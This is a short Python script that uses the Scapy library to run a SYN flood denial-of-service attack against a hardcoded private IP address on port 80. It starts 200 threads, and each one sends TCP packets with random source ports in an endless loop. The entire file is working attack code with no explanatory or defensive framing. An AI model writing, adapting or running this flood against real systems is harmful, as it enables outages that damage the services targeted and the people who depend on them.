from scapy.all import *
from time import sleep
import _thread
import random
 
target = '172.16.102.103'
port = 80
threadnum = 200
 
def synflood(target, port):
 
    while True:
        x = random.randint(0, 65535)
        send(IP(dst = target)/TCP(dport = port, sport = x), verbose=0)
 
def attack(target, port):
 
    print ("Start Attack...")
    for i in range(threadnum):
        _thread.start_new_thread(synflood, (target, port))
    while True:
        sleep(1)
 
attack(target, port)